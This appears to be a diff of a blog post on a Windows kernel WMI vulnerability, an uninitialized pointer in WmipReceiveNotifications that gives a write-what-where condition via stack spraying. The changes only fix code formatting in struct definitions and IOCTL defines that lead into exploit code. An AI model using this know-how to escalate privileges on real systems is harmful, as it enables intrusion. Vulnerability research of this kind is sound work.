@@ -60,7 +60,7 @@ v23 = *(_DWORD *)LocalBuffer;
 Utilizing an uninitialized local variable as a pointer to write arbitrary data to its referenced location requires the attacker to employ a stack spraying technique for successful exploitation. This vulnerability presents a "write-what-where" condition, offering multiple ways for exploitation, such as zero ACL or SET token permission.
 
 {% highlight cpp %}
-int __userpurge WmipReceiveNotifications @(int SystemBuffer @, unsigned int * OutputBufferSize, PVOID PIRP) {
+int __userpurge WmipReceiveNotifications(int SystemBuffer , unsigned int * OutputBufferSize, PVOID PIRP) {
      ...
      ...
  
@@ -154,8 +154,7 @@ typedef struct {
 }
 WMIRECEIVENOTIFICATION, * PWMIRECEIVENOTIFICATION;
  
-#
-define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring
+#define RECEIVE_ACTION_CREATE_THREAD 2 // Mark guid objects as requiring
  
 typedef struct {
     IN VOID * ObjectAttributes;
@@ -165,8 +164,7 @@ typedef struct {
 }
 WMIOPENGUIDBLOCK, * PWMIOPENGUIDBLOCK;
  
-#
-define IOCTL_WMI_ENUMERATE_GUIDS\
+#define IOCTL_WMI_ENUMERATE_GUIDS\
 CTL_CODE(FILE_DEVICE_UNKNOWN, WmiEnumerateGuidList, METHOD_BUFFERED, FILE_READ_ACCESS)
  
 void main() {
